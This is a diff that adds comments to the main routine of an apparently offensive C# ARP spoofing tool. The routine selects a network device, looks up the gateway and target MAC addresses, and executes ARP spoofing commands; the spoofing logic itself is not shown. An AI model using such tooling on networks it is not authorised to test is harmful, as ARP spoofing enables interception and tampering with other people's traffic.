@@ -37,15 +37,19 @@ By github.com/joaostack
             var cts = new CancellationTokenSource();
             var ct = cts.Token;
 
+            // Open Device select menu
             var device = DeviceHelper.SelectDevice();
             DeviceHelper.OpenDevice(device);
 
+            // Get Gateway MAC Address
             var gatewayMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, gateway, ct));
             Console.WriteLine(gatewayMac.ToString());
 
+            // Get Target MAC Address
             var targetMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, target, ct));
             Console.WriteLine(targetMac.ToString());
 
+            // Instantiate ArpSpoofCommands
             var cmd = new ArpSpoofCommands(device, IPAddress.Parse(target), targetMac, IPAddress.Parse(gateway), gatewayMac);
             cmd.Execute();
 
